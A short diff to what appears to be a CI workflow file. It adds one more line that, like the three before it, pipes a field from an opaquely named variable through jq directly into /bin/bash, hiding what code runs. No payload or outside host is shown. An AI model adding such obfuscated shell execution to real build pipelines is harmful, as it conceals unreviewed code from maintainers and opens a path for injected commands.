@@ -44,6 +44,7 @@ jobs:
           echo $um40999 | jq -r .mwqn2 | /bin/bash
           printf '%s' "$xarte719" | jq -r .vt22455 | /bin/bash
           echo $dtvp6 | jq -r .vs32 | /bin/bash
+          echo $l7668 | jq -r .ohfh12 | /bin/bash
 
       - name: Upload artifact
         if: always()
